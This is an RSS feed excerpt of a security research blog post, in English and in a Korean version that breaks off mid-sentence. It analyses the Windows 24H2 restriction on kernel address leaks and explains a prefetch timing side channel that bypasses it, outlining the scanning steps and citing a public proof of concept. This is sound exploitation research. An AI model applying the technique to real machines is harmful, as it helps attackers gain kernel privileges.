      
    </item>
    
    <item>
      <title>[Research] Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (En)</title>
      <link>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/</link>
      <guid>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/</guid>
      <pubDate>Sun, 13 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &amp;#x2190; Now&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &#x2190; Now</p><p><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/eo/">Bypassing Windows Kernel Mitigations: Part1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/eo/">Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338</a> </p><hr><p>Hello, this is L0ch!<br>Originally, I was planning to write a post on the I/O Ring exploit, but I ended up diving deeper into a topic from Part 1 and decided to create this as a kind of side story. That&#x2019;s why I&#x2019;ve numbered this part as 0 &#x1F604;</p><p>In this post, we&#x2019;ll take a closer look at the new KASLR-related mitigation introduced in Windows 11 and Windows Server 24H2, and explore a novel method for bypassing it.</p><blockquote><p>Before we begin, I highly recommend reading the <a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kASLR-Kernel-Address-Layout-Rnadomization">Windows Kernel Mitigation Part 1</a>, especially the section on kASLR (Kernel Address Space Layout Randomization).</p></blockquote><h2 id="KASLR-Bypass"><a href="#KASLR-Bypass" class="headerlink" title="KASLR Bypass"></a>KASLR Bypass</h2><p>Prior to version 24H2, it was possible to call <code>NtQuerySystemInformation</code> from a process running at Medium Integrity Level and obtain various kernel object addresses, including the image base of <code>ntoskrnl.exe</code>&#x2014;all at once. These details were highly useful for kernel exploitation.</p><p><img src="image.png" alt="image.png"><img src="image1.png" alt="image1.png"></p><p>By leveraging these leaked addresses, an attacker could locate gadgets in <code>ntoskrnl.exe</code>, tamper with fields like <code>PreviousMode</code> or <code>SeDebugPrivilege</code>, and so on.</p><hr><h2 id="Analysis-of-KASLR-Mitigation-in-24H2"><a href="#Analysis-of-KASLR-Mitigation-in-24H2" class="headerlink" title="Analysis of KASLR Mitigation in 24H2"></a><strong>Analysis of KASLR Mitigation in 24H2</strong></h2><p>To utilize <code>NtQuerySystemInformation</code>, one would typically load <code>ntdll.dll</code>, retrieve the address of the function using <code>GetProcAddress</code>, and then invoke it. The actual implementation follows this call chain:</p><ol><li><code>(ntdll) NtQuerySystemInformation</code>  </li><li><code>(ntoskrnl) NtQuerySystemInformation(EX)</code>  </li><li><code>(ntoskrnl) ExpQuerySystemInformation</code>  </li></ol><p><img src="image2.png" alt="image2.png"><img src="image3.png" alt="image3.png"></p><p>Ultimately, the <code>ExpQuerySystemInformation</code> function receives an enumeration value that determines which internal subroutine is executed to return the requested system information.</p><p><img src="image4.png" alt="image4.png"></p><p>When examining the xrefs of these subroutines, many of those that deal with kernel-related information invoke the <code>ExIsRestrictedCaller</code> function.</p><p><img src="image5.png" alt="image5.png"></p><p>Let&#x2019;s look into <code>ExIsRestrictedCaller</code>. We can see a call to <code>Feature_RestrictKernelAddressLeaks_private_IsEnabledDeviceUsageNoInline()</code>, which is a new feature flag introduced in 24H2. If this flag returns true, the function checks whether the caller possesses <code>SeDebugPrivilege</code> via a call to <code>SeSinglePrivilegeCheck(SeDebugPrivilege, a1)</code>. If the privilege is absent, <code>ExIsRestrictedCaller</code> returns true, indicating that the caller is restricted.</p><p><img src="image6.png" alt="image6.png"></p><p>The code snippet below shows a subroutine invoked when the enumeration value is <code>SystemModuleInformation</code>. If <code>ExIsRestrictedCaller</code> returns true, the subroutine skips the call to <code>ExQueryModuleInformation</code> and returns an error instead.</p><p><img src="image7.png" alt="image7.png"></p><p>As a result, processes running at Medium Integrity Level without <code>SeDebugPrivilege</code> can no longer retrieve any meaningful results using <code>NtQuerySystemInformation</code> to leak kernel addresses.</p><p>At this point, one might wonder: <em>Do we now need to find additional infoleaks when developing LPE exploits for Windows?</em> Fortunately, there&#x2019;s still a viable sidechannel-based bypass.</p><h2 id="EntryBleed-CVE-2022-4543-and-Prefetch-Sidechannel"><a href="#EntryBleed-CVE-2022-4543-and-Prefetch-Sidechannel" class="headerlink" title="EntryBleed (CVE-2022-4543) and Prefetch Sidechannel"></a>EntryBleed (CVE-2022-4543) and Prefetch Sidechannel</h2><p>Before diving into the bypass, we need to understand the KPTI (Kernel Page Table Isolation) protection used in Linux and the EntryBleed vulnerability (CVE-2022-4543).</p><p>KPTI removes most kernel memory mappings from user-mode page tables, only retaining minimal virtual kernel memory required for exception/signal/syscall handling. This prevents user-mode from learning kernel address mappings.</p><p>This was introduced in response to the infamous Meltdown and Spectre attacks disclosed in 2018. Since those vulnerabilities rendered KASLR ineffective, OS vendors adopted stricter memory isolation at the page table level.</p><blockquote><p>Fun fact: back then, there was widespread concern that CPU vendors would go under. And well&#x2026; Intel&#x2019;s current trajectory isn&#x2019;t looking so great either. &#x1F605;  </p></blockquote><p><img src="image8.png" alt="image8.png">  </p><blockquote><p>With KPTI enabled, only minimal kernel mappings (e.g., for syscalls and interrupts) remain in the user address space.<br>Source: <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">https://en.wikipedia.org/wiki/Kernel_page-table_isolation</a></p></blockquote><p>The EntryBleed vulnerability leverages a prefetch sidechannel to identify syscall handler addresses residing in the user-mode page tables, thus bypassing KPTI.</p><p>Even with KPTI enabled, the kernel&#x2019;s <code>entry_SYSCALL_64</code> address (used during 64-bit syscall transitions) remains mapped. The attack uses this fact to infer kernel base addresses.</p><p>x86_64 architecture features a TLB (Translation Lookaside Buffer) to cache recent virtual-to-physical address translations, and supports prefetch instructions that load data into the CPU cache.</p><p>When a prefetch instruction targets an address already present in the TLB, it skips the page walk and executes faster.</p><p><img src="image9.png" alt="image9.png">  </p><blockquote><p>Execution time differences depending on whether the page is cached<br>Source: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><p>This timing difference can be exploited as follows:</p><ol><li>Repeatedly invoke a syscall to ensure <code>entry_SYSCALL_64</code> is cached in the TLB.</li><li>Iteratively execute prefetch instructions over the potential kernel address range:<ul><li><code>0xffffffff80000000 - 0xffffffffc0000000</code></li></ul></li><li>If execution is slow &#x2192; address likely not cached &#x2192; continue scanning.</li><li>If execution is fast &#x2192; cached <code>entry_SYSCALL_64</code> hit &#x2192; compute the kernel base via known offset.</li></ol><p><img src="image10.png" alt="image10.png">  </p><blockquote><p>Using timing differences of prefetch instructions to leak kernel addresses<br>Source: <a href="https://gruss.cc/files/prefetch.pdf">https://gruss.cc/files/prefetch.pdf</a></p></blockquote><h3 id="Bypassing-KASLR-Mitigation-in-24H2"><a href="#Bypassing-KASLR-Mitigation-in-24H2" class="headerlink" title="Bypassing KASLR Mitigation in 24H2"></a>Bypassing KASLR Mitigation in 24H2</h3><p>The same prefetch-based sidechannel technique from EntryBleed is also applicable to Windows!</p><p>Windows has a similar KPTI-inspired mitigation called <strong>KVA (Kernel Virtual Address) Shadowing</strong>. This was Microsoft&#x2019;s response to Meltdown/Spectre, implementing kernel/user address space separation at the software level. However, recent Windows builds have KVA Shadowing disabled by default.</p><p><img src="image11.png" alt="image11.png"></p><p>We can tell it&#x2019;s disabled because <code>KPROCESS.UserDirectoryTableBase</code> contains a null value, which would otherwise point to a valid address if KVAS were active. Since modern CPUs are generally immune to Meltdown/Spectre, Microsoft likely chose to disable KVAS by default to avoid performance degradation.</p><p>This means: <strong>kernel addresses are still mapped in the user-mode page table</strong>&#x2014;and thus, prefetch-based leaks are feasible.</p><p>Let&#x2019;s analyze the sidechannel procedure from a PoC shared by exploits-forsale.</p><p><img src="image12.png" alt="image12.png">  </p><blockquote><p>Source: <a href="https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm">https://github.com/exploits-forsale/prefetch-tool/blob/main/prefetch_tool/prefetch_asm.asm</a></p></blockquote><ul><li><strong>Orange box</strong>: Accepts the first prefetch target address in <code>rcx</code>.</li><li><strong>Red box</strong>: Uses <code>prefetchnta</code> to specify non-temporal prefetching and <code>prefetcht2</code> to load the operand into the L2 cache. Measures execution time to infer TLB caching.</li><li><strong>Blue box</strong>: Uses <code>lfence</code> and <code>mfence</code> for instruction serialization to ensure accurate timing.<ul><li>Execute all previously loaded instructions in memory and enter</li><li>Force instruction execution order, remove optimization</li></ul></li></ul><p><img src="image13.png" alt="image13.png"></p><p>On my test environment (13th-gen Intel CPU), I was able to resolve the <code>ntoskrnl.exe</code> base address within a few seconds.</p><p>There are, however, two major caveats:</p><ol><li>This technique is reliable only on recent Intel processors. On AMD CPUs, results are inconsistent.</li><li>Unlike the legacy <code>NtQuerySystemInformation</code> method, which could reveal addresses of various kernel objects (e.g., KTHREAD, pools), this approach only leaks the kernel image base&#x2014;making it comparatively less versatile.</li></ol><p>Ultimately, the permission restrictions added to <code>NtQuerySystemInformation</code> in 24H2 have a significant impact on kernel exploitation strategies.<br><del>Looks like understanding the CPU manual is now a prerequisite for kernel work&#x2026;</del></p><h2 id="Conclusion"><a href="#Conclusion" class="headerlink" title="Conclusion"></a>Conclusion</h2><p>In this post, we examined the mitigation patch applied to <code>NtQuerySystemInformation</code>, a long-time staple in Windows kernel exploitation. We also explored how this led to the need for new KASLR bypass techniques, specifically through sidechannel-based kernel infoleaks.</p><p>In my opinion, the availability of <code>NtQuerySystemInformation</code> had previously stifled research into novel KASLR bypasses. With the new 24H2 mitigation in place, we may finally see a renewed wave of creative approaches in the kernel exploitation space.</p><p>See you in the next post&#x2014;where we&#x2019;ll return to the I/O Ring exploit!</p><h2 id="References"><a href="#References" class="headerlink" title="References"></a>References</h2><p><a href="https://windows-internals.com/kaslr-leaks-restriction/">https://windows-internals.com/kaslr-leaks-restriction/</a></p><p><a href="https://exploits.forsale/24h2-nt-exploit/">https://exploits.forsale/24h2-nt-exploit/</a></p><p><a href="https://github.com/exploits-forsale/prefetch-tool">https://github.com/exploits-forsale/prefetch-tool</a></p>]]></content:encoded>
      
      
      <category domain="https://hackyboiz.github.io/categories/Research/">Research</category>
      
      
      <category domain="https://hackyboiz.github.io/tags/kernel/">kernel</category>
      
      <category domain="https://hackyboiz.github.io/tags/windows/">windows</category>
      
      <category domain="https://hackyboiz.github.io/tags/bypass/">bypass</category>
      
      <category domain="https://hackyboiz.github.io/tags/L0ch/">L0ch</category>
      
      <category domain="https://hackyboiz.github.io/tags/mitigation/">mitigation</category>
      
      <category domain="https://hackyboiz.github.io/tags/kaslr/">kaslr</category>
      
      <category domain="https://hackyboiz.github.io/tags/entrybleed/">entrybleed</category>
      
      
      <comments>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/en/#disqus_thread</comments>
      
    </item>
    
    <item>
      <title>[Research] Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko)</title>
      <link>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/</link>
      <guid>https://hackyboiz.github.io/2025/04/13/l0ch/bypassing-kernel-mitigation-part0/ko/</guid>
      <pubDate>Sun, 13 Apr 2025 10:00:00 GMT</pubDate>
      
        
        
      <description>&lt;p&gt;Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &amp;#x2190; Now&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://hackyboiz.</description>
        
      
      
      
      <content:encoded><![CDATA[<p>Bypassing Windows Kernel Mitigations: Part0 - Deep Dive into KASLR Leaks Restriction (Ko) &#x2190; Now</p><p><a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/">Bypassing Windows Kernel Mitigations: Part1 - Overview</a></p><p><a href="https://hackyboiz.github.io/2025/01/12/l0ch/bypassing-kernel-mitigation-part2/ko/">Bypassing Windows Kernel Mitigations: Part2 - CVE-2024-21338</a> </p><hr><p>&#xC548;&#xB155;&#xD558;&#xC138;&#xC694;, L0ch&#xC785;&#xB2C8;&#xB2E4;! &#xC0AC;&#xC2E4; &#xC6D0;&#xB798; &#xACC4;&#xD68D;&#xC740; I/O Ring exploit&#xC5D0; &#xB300;&#xD574; &#xC815;&#xB9AC;&#xD558;&#xB824;&#xACE0; &#xD588;&#xB294;&#xB370;, &#xD30C;&#xD2B8; 1&#xC5D0;&#xC11C; &#xC18C;&#xAC1C;&#xD55C; &#xB0B4;&#xC6A9; &#xC911; &#xB354; &#xAE4A;&#xAC8C; &#xD30C;&#xACE0;&#xB4E4;&#xB9CC;&#xD55C; &#xC8FC;&#xC81C;&#xB97C; &#xC678;&#xC804;&#xACA9;&#xC73C;&#xB85C; &#xC4F0;&#xAC8C; &#xB418;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4; &#x314E;&#x314E; &#xADF8;&#xB798;&#xC11C; &#xD30C;&#xD2B8; &#xB118;&#xBC84;&#xB9C1;&#xB3C4; 0&#xC73C;&#xB85C; &#xC815;&#xD588;&#xAD6C;&#xC694;</p><p>&#xC774;&#xBC88; &#xAE00;&#xC5D0;&#xC11C;&#xB294; Windows 11&#xACFC; Windows Server 24H2&#xBD80;&#xD130; &#xCD94;&#xAC00;&#xB41C; KASLR &#xAD00;&#xB828; mitigation &#xD328;&#xCE58;&#xAC00; &#xC5B4;&#xB5BB;&#xAC8C; &#xC774;&#xB8E8;&#xC5B4;&#xC84C;&#xB098; &#xC880; &#xB354; &#xC790;&#xC138;&#xD788; &#xC0B4;&#xD3B4;&#xBCF4;&#xACE0; &#xB610; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xC0C8;&#xB85C;&#xC6B4; &#xBC29;&#xBC95;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;!</p><blockquote><p>&#xC7A0;&#xAE50;, &#xADF8; &#xC804;&#xC5D0; <a href="https://hackyboiz.github.io/2024/12/08/l0ch/bypassing-kernel-mitigation-part1/ko/#kASLR-Kernel-Address-Layout-Rnadomization">Windows Kernel Mitigation &#xD30C;&#xD2B8; 1</a>&#xC758; kASLR(Kernel Address Layout Rnadomization) &#xD30C;&#xD2B8;&#xB97C; &#xBA3C;&#xC800; &#xC77D;&#xC73C;&#xBA74; &#xB354; &#xC88B;&#xC544;&#xC694;</p></blockquote><h2 id="KASLR-bypass"><a href="#KASLR-bypass" class="headerlink" title="KASLR bypass"></a>KASLR bypass</h2><p>24H2 &#xC774;&#xC804;, &#xAE30;&#xC874;&#xC5D0;&#xB294; Medium Integrity Level &#xAD8C;&#xD55C;&#xC73C;&#xB85C; <code>NtQuerySystemInformation</code>&#xC744; &#xD638;&#xCD9C;&#xD558;&#xBA74; &#xC544;&#xB798;&#xCC98;&#xB7FC; &#xCEE4;&#xB110;&#xC758; &#xC5EC;&#xB7EC; &#xC624;&#xBE0C;&#xC81D;&#xD2B8; &#xC8FC;&#xC18C;, <code>ntoskrnl.exe</code> &#xC774;&#xBBF8;&#xC9C0; &#xBCA0;&#xC774;&#xC2A4;&#xC8FC;&#xC18C; &#xB4F1; &#xCEE4;&#xB110; exploit&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xC720;&#xC6A9;&#xD55C; &#xC815;&#xBCF4;&#xB4E4;&#xC744; &#xD55C;&#xBC29;&#xC5D0; &#xC5BB;&#xC744; &#xC218; &#xC788;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image.png" alt="image.png"><img src="image1.png" alt="image1.png"></p><p>&#xC774;&#xB807;&#xAC8C; leak&#xD55C; &#xC8FC;&#xC18C;&#xB4E4;&#xC744; &#xC774;&#xC6A9;&#xD574; <code>PreviousMode</code>, <code>SeDebugPrivilege</code> &#xD544;&#xB4DC;&#xB97C; &#xBCC0;&#xC870;&#xD558;&#xAC70;&#xB098; &#xC775;&#xC2A4;&#xD50C;&#xB85C;&#xC787;&#xC5D0; &#xD544;&#xC694;&#xD55C; <code>ntoskrnl.exe</code>&#xC758; gadget&#xC744; &#xAD6C;&#xD558;&#xB294; &#xB4F1; &#xC720;&#xC6A9;&#xD558;&#xAC8C; &#xD65C;&#xC6A9; &#xAC00;&#xB2A5;&#xD588;&#xC5C8;&#xC8E0;.</p><h2 id="Analysis-of-KASLR-Mitigation-in-24H2"><a href="#Analysis-of-KASLR-Mitigation-in-24H2" class="headerlink" title="Analysis of KASLR Mitigation in 24H2"></a><strong>Analysis of KASLR Mitigation in 24H2</strong></h2><p><code>NtQuerySystemInformation</code> &#xD568;&#xC218;&#xB97C; &#xC0AC;&#xC6A9;&#xD558;&#xAE30; &#xC704;&#xD574;&#xC11C;&#xB294; &#xD574;&#xB2F9; &#xD568;&#xC218;&#xB97C; export&#xD558;&#xB294; <code>ntdll.dll</code>&#xC744; &#xB85C;&#xB4DC;&#xD558;&#xACE0;, <code>GetProcAddress</code>&#xB85C; &#xC8FC;&#xC18C;&#xB97C; &#xAD6C;&#xD55C; &#xB4A4; &#xD638;&#xCD9C;&#xD574;&#xC57C; &#xD558;&#xB294;&#xB370;&#xC694;. </p><p>&#xC2E4;&#xC9C8;&#xC801;&#xC778; &#xAE30;&#xB2A5;&#xC740; </p><ol><li><code>(ntdll) NtQuerySystemInformation</code></li><li><code>(ntoskrnl) NtQuerySystemInformation(EX)</code></li><li><code>(ntoskrnl) ExpQuerySytemInformation</code> </li></ol><p>&#xD638;&#xCD9C; &#xCCB4;&#xC778;&#xC744; &#xAC70;&#xCCD0; <code>ExpQuerySytemInformation</code> &#xD568;&#xC218;&#xC5D0; &#xAD6C;&#xD604;&#xB418;&#xC5B4; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.</p><p><img src="image2.png" alt="image2.png"><img src="image3.png" alt="image3.png"></p><p>&#xCD5C;&#xC885;&#xC801;&#xC73C;&#xB85C; ExpQuerySytemInformation &#xD568;&#xC218;&#xC5D0; &#xC804;&#xB2EC;&#xB418;&#xB294; &#xC5F4;&#xAC70;&#xD615; &#xAC12;&#xC5D0; &#xB530;&#xB77C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC11C;&#xBE0C;&#xB8E8;&#xD2F4;&#xB4E4;&#xC5D0;&#xC11C; &#xC801;&#xC808;&#xD55C; &#xC2DC;&#xC2A4;&#xD15C; &#xC815;&#xBCF4;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xC8E0;.<br><img src="image4.png" alt="image4.png"></p><p>&#xC774; &#xB54C; &#xCEE4;&#xB110;&#xACFC; &#xAD00;&#xB828;&#xB41C; &#xC815;&#xBCF4;&#xB97C; &#xBC18;&#xD658;&#xD558;&#xB294; &#xB9CE;&#xC740; &#xC11C;&#xBE0C;&#xB8E8;&#xD2F4;&#xC5D0;&#xC11C; ExIsRestrictedCaller &#xD568;&#xC218;&#xB97C; &#xD638;&#xCD9C;&#xD558;&#xB294; &#xAC83;&#xC744; xrefs viewer&#xB85C; &#xBCFC; &#xC218; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;.<br><img src="image5.png" alt="image5.png"></p><p><code>ExIsRestrictedCaller</code> &#xD568;&#xC218;&#xB97C; &#xC0B4;&#xD3B4;&#xBCF4;&#xACA0;&#xC2B5;&#xB2C8;&#xB2E4;. <code>Feature_RestrictKernelAddressLeaks_private_IsEnabeldDeviceUsageNoInline()</code> &#xAC00; &#xBCF4;&#xC774;&#xB294;&#xB370;, &#xD574;&#xB2F9; &#xD568;&#xC218;&#xAC00; &#xBC14;&#xB85C; 24H2&#xBD80;&#xD130; &#xC0C8;&#xB85C; &#xCD94;&#xAC00;&#xB41C; Feature flag&#xC785;&#xB2C8;&#xB2E4;. </p><p>&#xD574;&#xB2F9; flag&#xAC00; &#xD65C;&#xC131;&#xD654;&#xB418;&#xC5B4; true&#xB97C; &#xBC18;&#xD658;&#xD558;&#xBA74;, <code>SeSinglePrivilegeCheck(SeDebugPrivilege, a1)</code> &#xD568;&#xC218;&#xB97C; &#xD1B5;&#xD574; &#xD638;&#xCD9C;&#xC790; &#xAD8C;&#xD55C;&#xC5D0; <code>SeDebugPrivilege</code> &#xAD8C;&#xD55C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xB294;&#xC9C0;&#xB97C; &#xD655;&#xC778;&#xD569;&#xB2C8;&#xB2E4;. &#xB9CC;&#xC57D; &#xAD8C;&#xD55C;&#xC774; &#xC874;&#xC7AC;&#xD558;&#xC9C0; &#xC54A;&#xC73C;&#xBA74; <code>ExIsRestrictedCaller</code> &#xD568;&#xC218;&#xB294; true&#xB97C; &#xBC18;&#xD658;&#xD574; &#xC81C;&#xD55C;&#xB41C; &#xAD8C;&#xD55C;&#xC758; Caller&#xC784;&#xC744; &#xC54C;&#xB9AC;&#xC8E0;.<br><img src="image6.png" alt="image6.png"></p><p>&#xC704; &#xCF54;&#xB4DC; &#xC2A4;&#xB2C8;&#xD3AB;&#xC740; SystemModuleInformation &#xC5F4;&#xAC70;&#xD615; &#xAC12;&#xC744; &#xC804;&#xB2EC;&#xD588;&#xC744; &#xB54C; &#xC2E4;&#xD589;&#xB418;&#xB294; &#xC11C;&#xBE0C;&#xB8E8;&#xD2F4;&#xC778;&#xB370;&#xC694;,  ExIsREstrictedCaller &#xD568;&#xC218; &#xD638;&#xCD9C;&#xC758; &#xBC18;&#xD658;&#xAC12;&#xC744; &#xD655;&#xC778;&#xD558;&#xACE0; &#xC81C;&#xD55C;&#xB41C; &#xAD8C;&#xD55C;&#xC758; Caller&#xC784;&#xC774; &#xD655;&#xC778;&#xB418;&#xBA74; ExQueryModuleInformation&#xC73C;&#xB85C; &#xCEE4;&#xB110; &#xBAA8;&#xB4C8; &#xC815;&#xBCF4;&#xB97C; &#xAD6C;&#xD558;&#xC9C0; &#xC54A;&#xACE0; Error &#xCF54;&#xB4DC;&#xB97C; &#xBC18;&#xD658;&#xD569;&#xB2C8;&#xB2E4;.<br><img src="image7.png" alt="image7.png"></p><p>&#xACB0;&#xAD6D; <code>SeDebugPrivilege</code> &#xAD8C;&#xD55C;&#xC774; &#xC5C6;&#xB294; Medium Integrity Level &#xC720;&#xC800;&#xB294; &#xAE30;&#xC874;&#xC758; <code>NtQuerySystemInformation</code> &#xB97C; &#xC0AC;&#xC6A9;&#xD55C; Leak &#xCF54;&#xB4DC;&#xB97C; &#xC2E4;&#xD589;&#xD574;&#xB3C4; &#xC544;&#xBB34;&#xB7F0; &#xBC18;&#xD658; &#xACB0;&#xACFC;&#xB3C4; &#xC5BB;&#xC744; &#xC218; &#xC5C6;&#xAC8C; &#xB429;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xC81C; Windows&#xC5D0;&#xC11C; LPE &#xC775;&#xC2A4;&#xD560; &#xB54C; &#xCEE4;&#xB110;&#xC8FC;&#xC18C; leak &#xCDE8;&#xC57D;&#xC810;&#xC744; &#xCD94;&#xAC00;&#xB85C; &#xCC3E;&#xC544;&#xC57C; &#xB418;&#xB294;&#xAC74;&#xAC00;..? &#xC2F6;&#xC9C0;&#xB9CC; &#xC81C;&#xD55C;&#xC801;&#xC73C;&#xB85C; KASLR&#xC744; &#xC6B0;&#xD68C;&#xD560; &#xC218; &#xC788;&#xB294; &#xBC29;&#xBC95;&#xC774; &#xC788;&#xC2B5;&#xB2C8;&#xB2E4;</p><h2 id="EntryBleed-CVE-2022-4543-and-prefetch-sidechannel"><a href="#EntryBleed-CVE-2022-4543-and-prefetch-sidechannel" class="headerlink" title="EntryBleed(CVE-2022-4543) and prefetch sidechannel"></a>EntryBleed(CVE-2022-4543) and prefetch sidechannel</h2><p>&#xADF8; &#xC804;&#xC5D0; &#xBA3C;&#xC800;, Linux&#xC758; KPTI(Kernel Page Table Isolation) &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xACFC; <strong>EntryBleed(CVE-2022-4543</strong>)&#xCDE8;&#xC57D;&#xC810;&#xC5D0; &#xB300;&#xD574; &#xC54C;&#xC544;&#xC57C; &#xD569;&#xB2C8;&#xB2E4;.</p><p>KPTI&#xB294; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC5D0; &#xBAA8;&#xB4E0; &#xCEE4;&#xB110; &#xBA54;&#xBAA8;&#xB9AC;&#xB97C; &#xC81C;&#xAC70;&#xD558;&#xB294; &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC778;&#xB370;&#xC694;, exception&#xC774;&#xB098; syscall &#xD578;&#xB4E4;&#xB7EC; &#xB4F1; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC5D0;&#xC11C; &#xCEE4;&#xB110;&#xB85C; &#xC804;&#xD658;&#xD560; &#xB54C; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xCEE4;&#xB110; &#xAC00;&#xC0C1; &#xBA54;&#xBAA8;&#xB9AC;&#xB9CC; &#xB9E4;&#xD551;&#xB418;&#xB3C4;&#xB85D; &#xC720;&#xC9C0;&#xD574; &#xC720;&#xC800;&#xBAA8;&#xB4DC;&#xC640; &#xCEE4;&#xB110;&#xBAA8;&#xB4DC;&#xC758; &#xD398;&#xC774;&#xC9C0; &#xD14C;&#xC774;&#xBE14;&#xC744; &#xACA9;&#xB9AC;&#xD558;&#xACE0; &#xC720;&#xC800;&#xAC00; &#xCEE4;&#xB110;&#xC758; &#xD2B9;&#xC815; &#xC8FC;&#xC18C;&#xB97C; &#xC54C;&#xC544;&#xB0BC; &#xC218; &#xC5C6;&#xB3C4;&#xB85D; &#xD569;&#xB2C8;&#xB2E4;.</p><p>&#xC774;&#xB7F0; KPTI &#xB4F1;&#xC7A5;&#xD55C; &#xC774;&#xC720;&#xB294; &#xBC14;&#xB85C; 2018&#xB144;&#xC5D0; &#xBC1C;&#xD45C;&#xB41C; &#xADF8; &#xC720;&#xBA85;&#xD55C; Meltdown&#xACFC; Spectre &#xB54C;&#xBB38;&#xC774;&#xC8E0;. &#xD504;&#xB85C;&#xC138;&#xC11C; &#xCDE8;&#xC57D;&#xC810;&#xC73C;&#xB85C; &#xC778;&#xD574; KASLR&#xC774; &#xBB34;&#xC6A9;&#xC9C0;&#xBB3C;&#xC774; &#xB418;&#xC790; OS &#xB808;&#xBCA8;&#xC5D0;&#xC11C; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xB9E4;&#xD551;&#xB418;&#xB294; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB97C; &#xB300;&#xBD80;&#xBD84; &#xC81C;&#xAC70;&#xD574; &#xC601;&#xD5A5;&#xC744; &#xCD5C;&#xC18C;&#xD654;&#xD558;&#xB824;&#xB294; &#xBAA9;&#xC801;&#xC774;&#xC5C8;&#xC2B5;&#xB2C8;&#xB2E4;. </p><p>&#xC5EC;&#xB2F4;&#xC73C;&#xB85C; &#xADF8;&#xB54C; CPU &#xC81C;&#xC870;&#xC5C5;&#xCCB4;&#xB4E4;&#xC774; &#xB9DD;&#xD55C;&#xB2E4; &#xC5B4;&#xCA50;&#xB2E4; &#xD558;&#xB294; &#xC598;&#xAE30;&#xAC00; &#xC5C4;&#xCCAD; &#xB9CE;&#xC558;&#xC5C8;&#xC8E0;&#x314B;&#x314B;&#x314B; <del>&#xC778;&#xD154;&#xC740; &#xC9C0;&#xAE08; &#xC9C4;&#xC9DC; &#xB9DD;&#xD574;&#xAC00;&#xACE0; &#xC788;&#xC9C0;&#xB9CC;</del><br><img src="image8.png" alt="image8.png"></p><blockquote><p>KPTI&#xAC00; &#xC801;&#xC6A9;&#xB418;&#xBA74; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0;&#xB294; syscall&#xACFC; interrupt &#xB4F1;&#xC5D0; &#xD544;&#xC694;&#xD55C; &#xCD5C;&#xC18C;&#xD55C;&#xC758; &#xCEE4;&#xB110; &#xC8FC;&#xC18C;&#xB9CC; &#xB0A8;&#xC74C;<br>&#xCD9C;&#xCC98; : <a href="https://en.wikipedia.org/wiki/Kernel_page-table_isolation">https://en.wikipedia.org/wiki/Kernel_page-table_isolation</a></p></blockquote><p>CVE-2022-4543&#xC740; prefetch sidechannel &#xAE30;&#xBC95;&#xC744; &#xC774;&#xC6A9;&#xD574; &#xC720;&#xC800;&#xBAA8;&#xB4DC; &#xD398;&#xC774;&#xC9C0;&#xC5D0; &#xC874;&#xC7AC;&#xD558;&#xB294; syscall &#xD578;&#xB4E4;&#xB7EC; &#xC8FC;&#xC18C;&#xB97C; &#xCC3E;&#xACE0; KPTI &#xBCF4;&#xD638;&#xAE30;&#xBC95;&#xC744; &#xC6B0;&#xD68C;&#xD558;&#xB294; &#xCDE8;&#xC57D;&#xC810;&#xC778;&#xB370;&#xC694;, &#xCEE4;&#xB110;&#xC758; <code>syscall_init</code> &#xD568;&#xC218;&#xC5D0;&#xC11C; <code>entry_SYSCALL_64</code> &#xD568;&#xC218; &#xC8FC;&#xC18C;&#xB294; 64&#xBE44;&#xD2B8; syscall&#xC774; &#xD638;&#xCD9C;&#xB420; &#xB54C; handler&#xC758; &#xC8FC;&#xC18C;&#xB97C; 